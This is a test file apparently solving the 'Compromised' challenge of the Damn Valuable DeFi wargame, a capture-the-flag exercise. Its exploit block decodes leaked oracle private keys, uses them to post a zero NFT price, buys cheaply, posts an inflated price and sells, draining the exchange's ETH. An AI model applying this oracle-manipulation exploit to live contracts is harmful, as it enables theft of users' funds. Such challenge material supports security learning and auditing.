const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const pks = [
          "4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535",
          "4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134",
        ]
        .map(hex => Buffer.from(hex, 'hex').toString())
        .map(base64 => Buffer.from(base64, 'base64').toString());

        const oracle1 = await web3.eth.personal.importRawKey(pks[0], "yolo");
        const oracle2 = await web3.eth.personal.importRawKey(pks[1], "yolo");
        await web3.eth.personal.unlockAccount(oracle1, "yolo", 100);
        await web3.eth.personal.unlockAccount(oracle2, "yolo", 100);

        await this.oracle.postPrice("DVNFT", 0, { from: oracle1 });
        await this.oracle.postPrice("DVNFT", 0, { from: oracle2 });
        await this.exchange.buyOne({ from: attacker, value: 1 });
        await this.oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, { from: oracle1 });
        await this.oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, { from: oracle2 });
        await this.token.approve(this.exchange.address, 1, { from: attacker });
        await this.exchange.sellOne(1, { from: attacker });
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
    });
});
